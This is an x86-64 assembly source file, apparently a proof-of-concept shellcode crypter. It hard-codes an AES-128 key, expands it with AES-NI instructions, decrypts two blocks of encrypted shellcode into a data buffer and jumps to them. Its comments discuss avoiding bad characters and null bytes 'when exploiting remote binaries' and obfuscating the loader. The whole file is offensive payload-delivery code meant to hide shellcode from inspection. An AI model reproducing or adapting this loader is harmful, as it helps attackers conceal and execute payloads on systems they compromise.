#$ as shellcodePoC.s -o shellcodePoC.o
#$ ld shellcodePoC.o -o shellcodePoC
.data
	.comm shellcode 32
# an unaligned buffer for the decrypted shellcode since, it's impossible (at least, I don't know how) to store an arbitrary length in the registers using XMM, stack won't work either, as well as rewriting assembly it-self
# it can cause some problems with memory randomization, thus not a very good idea

.globl _start
_start:

# let's store the key
movabs $0x1b614b73da6ac94c, %r14
# the first half of the key is reversed and goes to the R14, because Intel is little-endian and you can't store values directly to the XMM
movq %r14, %xmm0
# store it in the half of XMM0 (64 to 128 bits), it's pretty hackerish and undocumented since, XMM doesn't suppose to be modified directly, but with pointers
movabs $0xc3fdbc5e697e297b, %r15
# the second half of the key is each half-reversed and goes to the R15, because we need to swap it after
movq %r15, %xmm3
# store it in the half of XMM3
shufps $0x1b, %xmm0, %xmm0
# because XMM is 128 bits, we will put the first half of the key to the second half of XMM0 and its first half will be zeroed
shufps $0x1b, %xmm3, %xmm0
# we will put the first half of XMM3 to th first half of XMM0, thus the key is entirely stored in XMM0
# it's even more hackerish, but it's the best way I found to store an arbitrary value in the XMM without a pointer/buffer/location

# let's compute the key by expanding it since, we use AES
movaps %xmm0, %xmm5
pxor %xmm2, %xmm2
# erasing XMM2 is necessary, otherwise decryption might fail
# now the first round of the expansion
aeskeygenassist $1, %xmm0, %xmm1
# and the scheduling
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
# the end of the expansion
aesimc %xmm0, %xmm6
# same thing for the other 9 rounds since, we use 128-bit key
aeskeygenassist $2, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm7
# the 3rd round is omited because, it contains potentially bad character - 0x04 which is EOT and it can cause problems when exploiting remote binaries
aeskeygenassist $8, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm9
aeskeygenassist $16, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm10
# the 6th round is omited because, it contains potentially bad character - 0x20 which is space and it can cause problems when exploiting arguments in binaries
aeskeygenassist $64, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm12
aeskeygenassist $128, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm13
aeskeygenassist $27, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
aesimc %xmm0, %xmm14
aeskeygenassist $54, %xmm0, %xmm1
pshufd $0xff, %xmm1, %xmm1
shufps $0b00010000, %xmm0, %xmm2
pxor   %xmm2, %xmm0
shufps $0b10001100, %xmm0, %xmm2
pxor   %xmm2, %xmm0
pxor   %xmm1, %xmm0
# since it's the last round, the expansion ends here
movaps %xmm0, %xmm15
# I know that, all this could be optimized with a call to a macro (function), but I don't have time for this since, it needs to be obfuscated in order to eliminate all null bytes with jumps

# ok, now we can decrypt in ECB mode
# same routine as for th key goes for the code
movabs $0x1cd68f30c7218244, %r14
# first half of the code
movq %r14, %xmm0
movabs $0x2bf71a4f188cd8a0, %r15
# second half of the code (each half-reversed)
movq %r15, %xmm3
shufps $0x1b, %xmm0, %xmm0
shufps $0x1b, %xmm3, %xmm0

# the 10 round decryption
pxor       %xmm15, %xmm0
aesdec     %xmm14, %xmm0
aesdec     %xmm13, %xmm0
aesdec     %xmm12, %xmm0
# note that once again we omit the 6th rounded xmm11
aesdec     %xmm10, %xmm0
aesdec     %xmm9,  %xmm0
# and again we omit the 3rd rounded xmm8
aesdec     %xmm7,  %xmm0
aesdec     %xmm6,  %xmm0
aesdeclast %xmm5,  %xmm0

# finally, we can move the decrypted block to the memory
# the Linux location is 0x00600300, but will be 0x00600310 (not 0x00600078 though) and since it contains null bytes, we dont want this for our shellcode, so we will juste make a subtraction of some non null byted values, in order to obtain the address we need
movabs $0xffffffffff599999, %rdx
movabs $0xfffffffffef99689, %rsi
#movabs $0xffffffffff199921, %rsi
sub %rsi, %rdx
mov %rdx, %rsi
# we will save our pointer in RDX, in order not to have zeroes
movaps %xmm0, (%rsi)
# GCC's address could be 0x600900 or 0x6001280 and it could be obtained directly from RDX, so for the morpher we will save the pointer from RDX to RSI, without any additional mathematical operation, thereby the shellcode will rewrite it-self
    
# second block decryption juste like the first-one
movabs $0xeeea86607bdeaf09, %r14
movq %r14, %xmm0
movabs $0x7aa40344dd08133b, %r15
movq %r15, %xmm3
shufps $0x1b, %xmm0, %xmm0
shufps $0x1b, %xmm3, %xmm0

pxor       %xmm15, %xmm0
aesdec     %xmm14, %xmm0
aesdec     %xmm13, %xmm0
aesdec     %xmm12, %xmm0
aesdec     %xmm10, %xmm0
aesdec     %xmm9,  %xmm0
aesdec     %xmm7,  %xmm0
aesdec     %xmm6,  %xmm0
aesdeclast %xmm5,  %xmm0

# move it after already written 16 bytes, using RDX, so we are not limited by the length (16 will be constant, so no zeroes)
add $16, %rdx
movaps %xmm0, (%rdx)
# "Release The Kraken!" I mean, shellcode
jmpq *%rsi
